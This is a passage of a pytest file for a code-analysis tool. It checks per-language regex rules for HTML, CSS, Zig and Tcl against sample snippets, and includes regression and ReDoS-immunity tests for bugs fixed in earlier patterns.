    assert_redos_immune(HTML_RULES["reflection_metaprogramming"], 'style="' + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["ssr_boundaries"], "{{ " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["events"], '@click="' + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["spec_exposure"], "[SPEC-123 " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["class_start"], "<" + ("a-" * 20000), timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["_dependency_capture"], "<script " + "a" * 100000, timeout_sec=3.0)

    # sanity: all still match their real positive cases after the sweep
    assert HTML_RULES["args"].search('<input data-foo="bar">')
    assert HTML_RULES["safety"].search("<input required>")


# ==============================================================================
# CSS: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #577, part of epic #518)
# ==============================================================================
# NOTE: `branch`/`structural_boundaries` already carry BUG FIX comments from
# an earlier cross-language sweep (the leading-\b-before-@ trap) -- not
# re-litigated here, just covered by the positive/negative table below like
# any other already-correct rule.
CSS_RULES = LANGUAGE_DEFINITIONS["css"]["rules"]

_CSS_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "@media (min-width: 768px) {", ".foo { color: red; }"),
    ("args", "width: calc(100% - 10px);", "width: 100%;"),
    ("structural_boundaries", "@keyframes spin {", ".foo {"),
    ("func_start", "@media (min-width: 768px) {", ".foo {"),
    ("class_start", ".my-class {", "body {"),
    ("safety", "@supports (display: grid) {", ".foo { color: red; }"),
    ("safety_bypasses", "* { box-sizing: border-box; }", ".foo { color: red; }"),
    ("high_risk_execution", "width: expression(body.scrollTop);", "width: 100%;"),
    ("api", ":root { --main-color: blue; }", ".foo { color: blue; }"),
    ("dead_code", "/* .old-class { display: none; } */", ".live-class { display: block; }"),
    ("doc", "/** @param --color The theme color */", "/* just a note */"),
    ("test", "[data-testid='submit'] { color: red; }", ".foo { color: red; }"),
    ("ui_framework", "display: flex; justify-content: center;", "color: red;"),
    ("closures", ".parent {\n  & .child {\n    color: red;\n  }\n}", ".parent { color: red; }"),
    ("globals", ":root { --x: 1; }", ".foo { --x: 1; }"),
    ("scientific", "width: sqrt(100px);", "width: 100px;"),
    ("reflection_metaprogramming", "&& &", ".foo { color: red; }"),
    ("import", "@import url('base.css');", ".foo {}"),
    ("ownership", "/* @author Jane Doe */", "/* just a note */"),
    ("planned_debt", "/* TODO: refactor this */", "/* done */"),
    ("fragile_debt", "/* HACK: workaround */", "/* clean */"),
    ("spec_exposure", "/* [SPEC-123] compliance tag */", "/* just a note */"),
    ("events", "@scroll-timeline my-timeline {", ".foo {}"),
    ("panics_and_aborts", "all: unset;", "all: inherit;"),
    ("thread_sleeps", "transition-delay: 200ms;", "transition-duration: 200ms;"),
    ("immutability_locks", "color: red !important;", "color: red;"),
    ("encapsulation", "::part(header) {", ".foo {}"),
    ("listeners", "animation-timeline: scroll();", ".foo {}"),
    ("test_skip", "[data-skip] { display: none; }", ".foo {}"),
]


@pytest.mark.parametrize("signature,positive,negative", _CSS_SIMPLE_CASES)
def test_css_signature_positive_and_negative(signature, positive, negative):
    pattern = CSS_RULES[signature]
    assert pattern is not None, f"css's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"css {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), f"css {signature!r} incorrectly matched an excluded case: {negative!r}"


def test_css_class_start_and_func_start_capture_and_no_collision():
    class_start = CSS_RULES["class_start"]
    func_start = CSS_RULES["func_start"]

    m = class_start.search(".my-class {")
    assert m and m.group(1) == ".my-class"
    m2 = class_start.search("#my-id {")
    assert m2 and m2.group(1) == "#my-id"

    assert func_start.search("@media (min-width: 768px) {")
    assert not class_start.search("@media (min-width: 768px) {"), "class_start incorrectly matched an at-rule"
    assert not func_start.search(".my-class {"), "func_start incorrectly matched a class selector"


def test_css_dependency_capture_extracts_import_path():
    pattern = CSS_RULES["_dependency_capture"]
    m = pattern.search("@import url('base.css');")
    assert m and m.group(1) == "base.css"
    m2 = pattern.search('@import "theme.css";')
    assert m2 and m2.group(1) == "theme.css"


def test_css_args_and_scientific_nested_call_regression():
    """
    Regression test for a real bug (Rule 11): `[^)]*` cannot represent even
    one level of nesting. Modern CSS math functions nest constantly
    (`calc(var(--x) + 1px)`, `round(var(--x), 1px)`) -- confirmed the old
    patterns truncated at the first *inner* `)` instead of the true closing
    one.
    """
    old_args = re.compile(
        r"\b(?:calc|clamp|min|max|var|env|url|rgba?|hsla?|lch|oklch|color-mix|light-dark)\s*\([^)]*\)", re.I
    )
    nested = "calc(var(--x) + 1px)"
    old_m = old_args.search(nested)
    assert old_m and old_m.group(0) != nested, "sanity check: old pattern must reproduce the truncation"

    args = CSS_RULES["args"]
    m = args.search(nested)
    assert m and m.group(0) == nested, f"nested calc(var(...)) truncated: {m.group(0) if m else None!r}"

    old_sci = re.compile(
        r"\b(?:sin|cos|tan|asin|acos|atan|atan2|hypot|abs|sign|mod|rem|round|pow|sqrt|exp|log)\s*\([^)]*\)", re.I
    )
    nested_sci = "round(var(--x), 1px)"
    old_sci_m = old_sci.search(nested_sci)
    assert old_sci_m and old_sci_m.group(0) != nested_sci, "sanity check: old pattern must reproduce the truncation"

    scientific = CSS_RULES["scientific"]
    m2 = scientific.search(nested_sci)
    assert m2 and m2.group(0) == nested_sci, f"nested round(var(...)) truncated: {m2.group(0) if m2 else None!r}"

    # non-nested forms must still match cleanly
    assert args.search("calc(100% - 10px)").group(0) == "calc(100% - 10px)"
    assert scientific.search("sqrt(100px)").group(0) == "sqrt(100px)"


def test_css_args_and_scientific_nested_call_redos_immunity():
    assert_redos_immune(CSS_RULES["args"], "calc(" + "(" * 20000, timeout_sec=3.0)
    assert_redos_immune(CSS_RULES["scientific"], "sqrt(" + "(" * 20000, timeout_sec=3.0)
    assert CSS_RULES["args"].search("calc(100% - 10px)")


def test_css_class_start_lookahead_redos_regression():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `class_start`'s
    trailing lookahead had two adjacent quantifiers, `[ \\t,>+~:]*` then
    `[^{]*`, where the first's character set is a strict subset of the
    second's -- every character the first alternative can consume, the
    second can too, so on a long run of combinator/whitespace characters
    with no `{` ever appearing, the engine tries every possible split point
    between them before failing.

    Confirmed via direct scaling measurement against the OLD pattern before
    writing this test (payload: ".foo" + " ,>+~:" repeated n times, no "{"
    anywhere): n=500/1000/2000/4000 -> 0.0058s/0.0231s/0.0920s/0.3673s, a
    clean ~4x per doubling (the textbook O(n^2) signature). The fix simply
    drops the redundant first quantifier (`[^{]*` alone already matches
    everything it did) -- post-fix scaling at n=2000/8000/32000 is
    0.0001s/0.0004s/0.0016s, clean ~2x per doubling (linear).
    """
    old_pattern = re.compile(r"^[ \t]*(\.[a-zA-Z_][\w-]*|#[a-zA-Z_][\w-]*)(?=[ \t,>+~:]*[^{]*\{)", re.M)
    payload = ".foo" + (" ,>+~:" * 2000)

    start = time.perf_counter()
    old_pattern.search(payload)
    old_duration = time.perf_counter() - start
    assert old_duration > 0.05, (
        f"sanity check: old pattern was expected to show measurable quadratic cost at this size "
        f"but only took {old_duration:.4f}s"
    )

    class_start = CSS_RULES["class_start"]
    assert_redos_immune(class_start, ".foo" + (" ,>+~:" * 200000), timeout_sec=3.0)
    assert class_start.search(".foo, .bar > .baz {")
    assert class_start.search(".foo > .bar {")


def test_css_spec_exposure_redos_regression():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the SPEC
    alternative's unbounded `\\d+` sits directly adjacent to the
    also-unbounded `[^\\]]*`, whose character class fully overlaps digits --
    classic adjacent-overlapping-quantifier shape (same bug class already
    found and fixed in embedded_python's independent copy of this pattern).
    Confirmed ~4x runtime per doubling on "[SPEC-" + digits with no closing
    bracket before writing this test; bounded `\\d+` to `\\d{1,10}` and
    `[^\\]]*` to `{0,300}`.
    """
    old_pattern = re.compile(r"\[(?:\s*SPEC\s*-\s*\d+|spec|audit)[^\]]*\]|\bfigma\.com/file/", re.I)
    payload = "[SPEC-" + "1" * 8000

    start = time.perf_counter()
    old_pattern.search(payload)
    old_duration = time.perf_counter() - start
    assert old_duration > 0.02, (
        f"sanity check: old pattern was expected to show measurable quadratic cost at this size "
        f"but only took {old_duration:.4f}s"
    )

    spec_exposure = CSS_RULES["spec_exposure"]
    assert_redos_immune(spec_exposure, "[SPEC-" + "1" * 100000, timeout_sec=3.0)
    assert spec_exposure.search("[SPEC-123] compliance tag")


def test_css_dead_code_multi_char_selector_and_brace_spacing_regression():
    """
    Regression test for 2 real bugs sharing one root cause (a shared
    trailing `\\b` across mismatched alternative shapes):

    1. `\\.[a-zA-Z]`/`#[a-zA-Z]` matched exactly ONE letter after the
       dot/hash with no continuation quantifier -- a realistic
       multi-character class/id name (`.old-class`, `#old-id`) never
       matched at all, only ever a contrived single-letter name would.
    2. The `{`-ending tag-selector alternative shared that same trailing
       `\\b`. `{` is non-word, and the character immediately following a
       real opening brace is very commonly whitespace (`div { display:
       none; }`) -- also non-word -- so `\\b` between two non-word
       characters never fired; only the no-space form (`div{display`)
       ever matched.
    """
    old_pattern = re.compile(
        r"/\*[ \t]*(?:@media|@container|@supports|@keyframes|\.[a-zA-Z]|#[a-zA-Z]|[a-zA-Z][\w-]*[ \t]*{)\b",
        re.I,
    )
    assert not old_pattern.search("/* .old-class { */"), "sanity check: bug must reproduce for multi-letter class"
    assert not old_pattern.search("/* #old-id { */"), "sanity check: bug must reproduce for multi-letter id"
    assert not old_pattern.search("/* div { display:none; } */"), "sanity check: bug must reproduce for spaced brace"
    assert old_pattern.search("/* div{display:none;} */"), "sanity check: no-space form already worked"

    dead_code = CSS_RULES["dead_code"]
    assert dead_code.search("/* .old-class { */"), "multi-letter class still didn't match"
    assert dead_code.search("/* #old-id { */"), "multi-letter id still didn't match"
    assert dead_code.search("/* div { display:none; } */"), "spaced-brace tag selector still didn't match"
    assert dead_code.search("/* div{display:none;} */"), "no-space form regressed"
    assert dead_code.search("/* @media (min-width: 768px) { */"), "@-rule form regressed"
    assert not dead_code.search(".live-class { color: red; }"), "live, uncommented code incorrectly matched"


def test_css_safety_and_branch_supports_intentional_double_classification():
    """
    Ambiguity sweep: `safety` and `branch` both list `@supports\\b`.
    Confirmed genuine, intentional double-classification, not a bug: an
    `@supports` feature query is simultaneously a defensive fallback
    mechanism (safety) AND a conditional branch (branch) -- both readings
    are correct for the same construct.
    """
    safety = CSS_RULES["safety"]
    branch = CSS_RULES["branch"]
    supports_query = "@supports (display: grid) {"
    assert safety.search(supports_query)
    assert branch.search(supports_query)


def test_css_encapsulation_and_structural_boundaries_scope_intentional_double_classification():
    """
    Ambiguity sweep: `encapsulation` and `structural_boundaries` both list
    `@scope\\b`. Confirmed intentional: `@scope` is simultaneously a
    structural at-rule boundary AND an explicit encapsulation/scoping
    mechanism -- both readings are correct.
    """
    encapsulation = CSS_RULES["encapsulation"]
    structural_boundaries = CSS_RULES["structural_boundaries"]
    scope_rule = "@scope (.card) to (.content) {"
    assert encapsulation.search(scope_rule)
    assert structural_boundaries.search(scope_rule)


def test_css_lexical_family_dual_comment_style_dead_code_audit():
    """
    Comment-style audit (Rule 12): css's lexical_family is `standard_block`,
    which per the doc's family definition supports block comments (`/* */`)
    natively; SCSS/Less/Stylus preprocessors (all sharing this language
    entry via extensions .scss/.less/.styl) also commonly use `//`
    line comments. dead_code is only wired to `/* */` -- confirmed it does
    NOT fire on a `//`-commented-out selector, which is a real gap for the
    preprocessor dialects but consistent with `standard_block`'s baseline
    (line-comment support for SCSS/Less specifically isn't part of this
    issue's checklist; documented here rather than silently assumed clean).
    """
    dead_code = CSS_RULES["dead_code"]
    assert dead_code.search("/* .old-class { display: none; } */")
    assert not dead_code.search("// .old-class { display: none; }")


def test_css_redos_immunity_sweep():
    """
    ReDoS immunity sweep across css's remaining unbounded-quantifier rules
    not covered by the dedicated regression tests above. Each has a single
    quantified segment with no adjacent overlapping-charset quantifier to
    backtrack against.
    """
    assert_redos_immune(CSS_RULES["safety"], "clamp(" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(CSS_RULES["api"], "::part(" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(CSS_RULES["ownership"], "/* @author " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(CSS_RULES["globals"], ":root {" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(CSS_RULES["events"], "animation-timeline: scroll(" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(CSS_RULES["_dependency_capture"], "@import url(" + "a" * 100000, timeout_sec=3.0)

    # sanity: all still match their real positive cases after the sweep
    assert CSS_RULES["safety"].search("@supports (display: grid) {")
    assert CSS_RULES["api"].search(":root { --x: 1; }")


# ==============================================================================
# ZIG: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #618, part of epic #518)
# ==============================================================================
# NOTE: most of zig's @-prefixed-builtin rules (safety_bypasses,
# high_risk_execution, concurrency, scientific, reflection_metaprogramming,
# import, explicit_casts, panics_and_aborts) already carry BUG FIX comments
# from an earlier cross-language sweep fixing the leading-\b-before-@ trap --
# not re-litigated here, just covered by the positive/negative table below
# like any other already-correct rule.
ZIG_RULES = LANGUAGE_DEFINITIONS["zig"]["rules"]

_ZIG_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if (x == 0) { return; }", "const x = 5;"),
    ("args", "fn add(a: i32, b: i32) i32 {", "const x = 5;"),
    ("structural_boundaries", "var x: i32 = 0;", "const x: i32 = 0;"),
    ("func_start", "pub fn main() void {", "const Point = struct {"),
    ("class_start", "const Point = struct {", "pub fn main() void {"),
    ("safety", "try foo();", "foo();"),
    ("safety_bypasses", "const x = @ptrCast(*u8, &y);", "const x: *u8 = &y;"),
    ("high_risk_execution", '@panic("unreachable state");', "return error.Bad;"),
    ("io", "const file = try std.fs.cwd().openFile(path, .{});", "const x = 5;"),
    ("api", "pub fn main() void {", "fn helper() void {"),
    ("state_mutation", "var x: i32 = 0;", "const x: i32 = 0;"),
    ("dead_code", "// fn oldFunc() void {}", "// just a note"),
    ("doc", "/// Computes the sum of two integers.", "// just a note"),
    ("test", 'test "basic addition" {', "fn add() void {}"),
    ("concurrency", "const t = try std.Thread.spawn(.{}, worker, .{});", "const x = 5;"),
    ("ui_framework", 'mach.core.setTitle("App");', "const x = 5;"),
    ("globals", 'pub const version = "1.0";', "x.field = 5;"),
    ("generics", "fn max(comptime T: type, a: T, b: T) T {", "fn add(a: i32, b: i32) i32 {"),
    ("scientific", "const result = std.math.sqrt(x);", "const x = 5;"),
    ("reflection_metaprogramming", "const info = @typeInfo(T);", "const x = 5;"),
    ("import", 'const std = @import("std");', "const x = 5;"),
    ("ownership", "// Author: Jane Doe", "// just a note"),
    ("planned_debt", "// TODO: refactor this", "// done"),
    ("fragile_debt", "// HACK: workaround", "// clean"),
    ("spec_exposure", "// [SPEC-123]", "// just a note"),
    ("ssr_boundaries", "fn handler(req: zap.Request) void {", "fn handler() void {"),
    ("events", "std.posix.epoll_wait(fd, &events, -1);", "const x = 5;"),
    ("pointers", "const p: *const u8 = &x;", "const x: u8 = 5;"),
    ("memory_alloc", "const buf = try allocator.alloc(u8, 10);", "const x = 5;"),
    ("inline_asm", 'asm volatile ("nop");', "const x = 5;"),
    ("telemetry", 'std.log.info("starting", .{});', "const x = 5;"),
    ("debug_prints", 'std.debug.print("x = {}\\n", .{x});', 'std.log.info("x", .{});'),
    ("explicit_casts", "const y = @intCast(i32, x);", "const y: i32 = x;"),
    ("panics_and_aborts", "unreachable;", "const x = 5;"),
    ("thread_sleeps", "std.time.sleep(1000);", "const x = 5;"),
    ("bitwise_ops", "const mask = a & b;", "const sum = a + b;"),
    ("sync_locks", "var mutex = std.Thread.Mutex{};", "const x = 5;"),
    ("immutability_locks", "const x: i32 = 5;", "var x: i32 = 5;"),
    ("cleanup", "defer allocator.free(buf);", "const x = 5;"),
    ("encapsulation", "fn helper() void {", "pub fn helper() void {"),
    ("test_skip", "std.testing.expect(true) catch unreachable;", "const x = 5;"),
    ("serialization_parsing", "const parsed = try std.json.parseFromSlice(T, allocator, data, .{});", "const x = 5;"),
    ("regex_execution", "const idx = std.mem.indexOf(u8, haystack, needle);", "const x = 5;"),
    ("time_date_logic", "const ts = std.time.milliTimestamp();", "const x = 5;"),
    ("ipc_rpc_bridges", "var child = std.process.Child.init(&argv, allocator);", "const x = 5;"),
]


@pytest.mark.parametrize("signature,positive,negative", _ZIG_SIMPLE_CASES)
def test_zig_signature_positive_and_negative(signature, positive, negative):
    pattern = ZIG_RULES[signature]
    assert pattern is not None, f"zig's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"zig {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), f"zig {signature!r} incorrectly matched an excluded case: {negative!r}"


def test_zig_func_start_and_class_start_capture_names():
    func_start = ZIG_RULES["func_start"]
    m = func_start.search("pub fn main() void {")
    assert m and m.group(1) == "main"
    m2 = func_start.search("fn max(comptime T: type, a: T, b: T) T {")
    assert m2 and m2.group(1) == "max", "func_start should still capture the name past a generic comptime param"

    class_start = ZIG_RULES["class_start"]
    m3 = class_start.search("pub const Point = struct {")
    assert m3 and m3.group(1) == "Point"
    m4 = class_start.search("const Color = enum {")
    assert m4 and m4.group(1) == "Color"

    assert not class_start.search("pub fn main() void {"), "class_start incorrectly matched a function"
    assert not func_start.search("const Point = struct {"), "func_start incorrectly matched a struct"


def test_zig_dependency_capture_extracts_import_path():
    pattern = ZIG_RULES["_dependency_capture"]
    m = pattern.search('const std = @import("std");')
    assert m and m.group(1) == "std"
    m2 = pattern.search('@cInclude("stdio.h");')
    assert m2 and m2.group(1) == "stdio.h"


def test_zig_at_prefixed_builtins_already_fixed_confirmed():
    """
    Confirms the leading-\\b-before-@ trap fix (from an earlier
    cross-language sweep) actually holds for all 8 already-BUG-FIX-annotated
    rules -- not re-deriving the fix, just verifying it against realistic
    same-line usage (an @builtin is virtually always preceded by whitespace
    or `=`, never a word character, so this is the realistic form the old
    shared \\b would have failed on).
    """
    assert ZIG_RULES["safety_bypasses"].search("const y = @ptrCast(*u8, &x);")
    assert ZIG_RULES["high_risk_execution"].search('if (bad) @panic("oops");')
    assert ZIG_RULES["concurrency"].search("const v = @atomicLoad(i32, &counter, .seq_cst);")
    assert ZIG_RULES["scientific"].search("const v: @Vector(4, f32) = undefined;")
    assert ZIG_RULES["reflection_metaprogramming"].search("const info = @typeInfo(T);")
    assert ZIG_RULES["import"].search('const std = @import("std");')
    assert ZIG_RULES["explicit_casts"].search("const y = @intCast(i32, x);")
    assert ZIG_RULES["panics_and_aborts"].search('if (bad) @panic("oops");')


def test_zig_args_nested_fn_pointer_param_regression():
    """
    Regression test for a real bug (Rule 11, nested-delimiter): `[^)]*` is a
    flat negated class, can't represent even one level of nesting. Zig
    function-pointer-type parameters nest constantly (`fn foo(callback:
    fn(i32) void) void`, a common callback-parameter idiom) -- confirmed the
    old pattern truncated at the first *inner* `)` instead of the true
    closing one.
    """
    old_pattern = re.compile(r"\bfn\s*(?:[a-zA-Z_]\w*\s*)?\([^)]*\)")
    nested = "fn foo(callback: fn(i32) void) void {"
    old_m = old_pattern.search(nested)
    assert old_m and old_m.group(0) == "fn foo(callback: fn(i32)", "sanity check: old pattern must truncate"

    args = ZIG_RULES["args"]
    m = args.search(nested)
    assert m and m.group(0) == "fn foo(callback: fn(i32) void)", (
        f"nested fn-pointer-param call truncated: {m.group(0) if m else None!r}"
    )
    assert args.search("fn add(a: i32, b: i32) i32").group(0) == "fn add(a: i32, b: i32)"


def test_zig_args_nested_redos_immunity():
    assert_redos_immune(ZIG_RULES["args"], "fn(" + "(" * 20000, timeout_sec=3.0)
    assert ZIG_RULES["args"].search("fn add(a: i32, b: i32) i32")


def test_zig_test_quoted_name_trailing_boundary_regression():
    """
    Regression test for a real bug: `test\\s+"[^"]*"` ended on `"`, inside
    the shared trailing `\\b` group. The character after a closing quote in
    real usage (`test "basic" {`) is a space then `{` -- both non-word, so
    the shared trailing `\\b` never fired. This is Zig's *dominant* real-
    world test declaration shape (a quoted description), not an edge case.
    """
    old_pattern = re.compile(r'\b(test\s+"[^"]*"|test\s+[a-zA-Z_]\w*|std\.testing\.expect|std\.testing\.expectEqual)\b')
    realistic = 'test "basic addition" {'
    assert not old_pattern.search(realistic), "sanity check: bug must reproduce against the old pattern"

    test_ = ZIG_RULES["test"]
    assert test_.search(realistic), "quoted test-name form still didn't match"
    assert test_.search("test my_named_test {"), "named-identifier test form regressed"
    assert test_.search("try std.testing.expect(x == 1);"), "std.testing.expect form regressed"
    assert test_.search("try std.testing.expectEqual(1, x);"), "std.testing.expectEqual form regressed"


def test_zig_func_start_vs_generics_no_false_collision():
    """
    Known ambiguity pattern from the issue template (deeply nested generic
    return types triggering catastrophic backtracking against func_start,
    as seen in C#). Verified empirically rather than assumed: a comptime
    generic parameter inside the arg list (`fn max(comptime T: type, a: T,
    b: T) T {`) doesn't confuse func_start's name capture, and doesn't
    trigger pathological backtracking even with a long chain of comptime
    params.
    """
    func_start = ZIG_RULES["func_start"]
    generics = ZIG_RULES["generics"]

    generic_fn = "fn max(comptime T: type, a: T, b: T) T {"
    assert generics.search(generic_fn)
    m = func_start.search(generic_fn)
    assert m and m.group(1) == "max"

    assert_redos_immune(func_start, "pub " * 50000 + "fn foo(", timeout_sec=3.0)


def test_zig_explicit_casts_vs_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition). Verified empirically: casts
    (`@ptrCast`/`@intCast`/etc.) and pointer syntax (`*const T`, `[*]T`,
    `.*`) are structurally distinct token shapes in Zig and never match the
    *same* substring -- a statement combining both (`const p: *const u8 =
    @ptrCast(&x);`) correctly fires both signatures on their own disjoint
    spans, which is genuine intentional double-classification (the
    statement really does contain both a cast and a pointer type), not a
    false collision.
    """
    casts = ZIG_RULES["explicit_casts"]
    pointers = ZIG_RULES["pointers"]

    combined = "const p: *const u8 = @ptrCast(&x);"
    cast_match = casts.search(combined)
    ptr_match = pointers.search(combined)
    assert cast_match and cast_match.group(0) == "@ptrCast"
    assert ptr_match and ptr_match.group(0) == "*const u8"
    assert cast_match.group(0) != ptr_match.group(0), "should match disjoint spans, not the same text"


def test_zig_test_vs_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (TypeScript's
    `.test('x')` regex method miscounted as a test-framework call). Zig has
    no native regex; `regex_execution` maps to `std.mem` string-search
    functions instead -- structurally distinct from `test`'s
    `test "..."`/`test name`/`std.testing.*` forms, no realistic overlap.
    """
    test_ = ZIG_RULES["test"]
    regex_execution = ZIG_RULES["regex_execution"]

    mem_search = "const idx = std.mem.indexOf(u8, haystack, needle);"
    assert regex_execution.search(mem_search)
    assert not test_.search(mem_search)

    test_block = 'test "basic" {'
    assert test_.search(test_block)
    assert not regex_execution.search(test_block)


def test_zig_state_mutation_and_pointers_deref_assign_intentional_double_classification():
    """
    Ambiguity sweep: `state_mutation` and `pointers` both fire on a pointer
    dereference assignment (`ptr.* = 5;`). Confirmed genuine, intentional
    double-classification: the statement is simultaneously a state mutation
    (flux) AND explicit pointer dereference syntax -- both readings are
    correct for the same construct.
    """
    state_mutation = ZIG_RULES["state_mutation"]
    pointers = ZIG_RULES["pointers"]
    deref_assign = "ptr.* = 5;"
    assert state_mutation.search(deref_assign)
    assert pointers.search(deref_assign)


def test_zig_structural_boundaries_and_panics_and_aborts_shared_literals_intentional():
    """
    Ambiguity sweep: `structural_boundaries` and `panics_and_aborts` both
    list `return` and `unreachable`. Confirmed intentional, not a bug:
    both constructs genuinely interrupt straight-line execution flow
    (structural_boundaries' framing) AND forcefully end the current
    execution context (panics_and_aborts' framing) -- both readings are
    correct for the same keywords, found empirically by checking the
    actual .search() results rather than assumed from the shared literal
    alone.
    """
    structural_boundaries = ZIG_RULES["structural_boundaries"]
    panics_and_aborts = ZIG_RULES["panics_and_aborts"]

    assert structural_boundaries.search("return;")
    assert panics_and_aborts.search("return;")
    assert structural_boundaries.search("unreachable;")
    assert panics_and_aborts.search("unreachable;")


def test_zig_encapsulation_default_private_semantics():
    """
    `encapsulation` uses a negative lookahead ((?!(?:pub|export|extern)\\b))
    to capture Zig's implicit-private-by-default visibility model (Rule 1:
    semantic intent over keyword matching) -- a declaration is "encapsulated"
    precisely when it's NOT explicitly marked pub/export/extern.
    """
    encapsulation = ZIG_RULES["encapsulation"]
    assert encapsulation.search("fn helper() void {"), "unmarked (private-by-default) fn should match"
    assert encapsulation.search("const secret = 42;"), "unmarked (private-by-default) const should match"
    assert not encapsulation.search("pub fn helper() void {"), "pub fn incorrectly matched as encapsulated"
    assert not encapsulation.search("export fn helper() void {"), "export fn incorrectly matched as encapsulated"


def test_zig_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: zig is `line_exclusive` (Zig intentionally has no
    block comments, only `//`) -- no rule tracks open/close block-comment
    state, matching the language's own real syntax. Confirms a stray `*/`
    (invalid in Zig, but plausible as accidental leftover text) doesn't fool
    any rule into a false structural match.
    """
    branch = ZIG_RULES["branch"]
    stray_close = "some text */ if (x == 0) { return; }"
    assert branch.search(stray_close), "branch should still see 'if' regardless of the stray */ before it"


def test_zig_redos_immunity_sweep():
    """
    ReDoS immunity sweep across zig's remaining unbounded-quantifier rules.
    Verified via a systematic scaling sweep before writing this test (7
    adversarial payload shapes -- unterminated parens/braces/pipes/brackets/
    at-signs, cross-newline runs, and long trailing content -- at
    n=2000/8000/32000 against every non-None rule): nothing exceeded 0.3s at
    n=32000 against any shape. This locks that in with
    assert_redos_immune's subprocess-kill timeout for the rules with the
    most visible unbounded quantifiers.
    """
    assert_redos_immune(ZIG_RULES["func_start"], "pub " * 50000, timeout_sec=3.0)
    assert_redos_immune(ZIG_RULES["class_start"], "const " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ZIG_RULES["globals"], "const x" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ZIG_RULES["safety"], "|" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ZIG_RULES["inline_asm"], "asm volatile (" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ZIG_RULES["pointers"], "= *" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ZIG_RULES["_dependency_capture"], '@import("' + "a" * 100000, timeout_sec=3.0)

    # sanity: all still match their real positive cases after the sweep
    assert ZIG_RULES["func_start"].search("pub fn main() void {")
    assert ZIG_RULES["class_start"].search("const Point = struct {")


# ==============================================================================
# TCL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #614, part of epic #518)
# ==============================================================================
TCL_RULES = LANGUAGE_DEFINITIONS["tcl"]["rules"]

_TCL_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if {$x == 0} {", "set x 5"),
    ("args", "proc add {a b} {\n    return [expr {$a + $b}]\n}", "set x 5"),
    ("structural_boundaries", "proc foo {} {", "set x 5"),
    ("func_start", "proc add {a b} {", "set x 5"),
    ("class_start", "oo::class create Point {", "proc add {a b} {"),
    ("safety", "catch {risky} err", "risky"),
    ("safety_bypasses", "eval $cmd", "puts $cmd"),
    ("high_risk_execution", "exec ls -la", "puts hello"),
    ("io", "set f [open $path r]", "set x 5"),
    ("api", "package provide mypkg 1.0", "set x 5"),
    ("state_mutation", "set x 5", "puts $x"),
    ("dead_code", "# proc oldFunc {} {}", "# just a note"),
    ("doc", "# @param x the input value", "# just a note"),
    ("test", "do_test basic-1.1 {expr {1+1}} {2}", "expr {1+1}"),
    ("concurrency", "after 100 callback", "set x 5"),
    ("ui_framework", "button .b -text Hi", "set x 5"),
    ("closures", "set fn [apply {{x} {return $x}} 5]", "proc fn {x} {return $x}"),
    ("globals", "global x y", "set x 5"),
    ("comprehensions", "lmap x $list {expr {$x * 2}}", "foreach x $list {}"),
    ("scientific", "expr {sin($x)}", "set x 5"),
    ("reflection_metaprogramming", "trace add variable x write cb", "set x 5"),
    ("import", "package require Tcl 8.6", "set x 5"),
    ("ownership", "# Author: Jane Doe", "# just a note"),
    ("planned_debt", "# TODO: refactor this", "# done"),
    ("fragile_debt", "# HACK: workaround", "# clean"),
    ("spec_exposure", "# [SPEC-123] compliance tag", "# just a note"),
    ("events", "bind .b <Button-1> callback", "set x 5"),
    ("telemetry", "logger::init myapp", "puts hello"),
    ("debug_prints", "puts hello", "logger::init myapp"),
    ("explicit_casts", "expr int($x)", "set x 5"),
    ("panics_and_aborts", 'error "bad state"', "return"),
    ("thread_sleeps", "after 1000", "after idle callback"),
    ("bitwise_ops", "set mask [expr {$a & $b}]", "set sum [expr {$a + $b}]"),
    ("sync_locks", "thread::mutex lock $m", "set x 5"),
    ("immutability_locks", "trace add variable x write lockCb", "set x 5"),
    ("cleanup", "close $f", "set x 5"),
    ("encapsulation", "namespace eval ::myns {", "proc publicFn {} {}"),
    ("listeners", "fileevent $sock readable cb", "set x 5"),
    ("test_skip", "-constraints unix", "set x 5"),
]


@pytest.mark.parametrize("signature,positive,negative", _TCL_SIMPLE_CASES)
def test_tcl_signature_positive_and_negative(signature, positive, negative):
    pattern = TCL_RULES[signature]
    assert pattern is not None, f"tcl's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"tcl {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), f"tcl {signature!r} incorrectly matched an excluded case: {negative!r}"


def test_tcl_func_start_and_class_start_capture_names():
    func_start = TCL_RULES["func_start"]
    m = func_start.search("proc add {a b} {")
    assert m and m.group(1) == "add"
    m2 = func_start.search("proc ::my::func {} {")
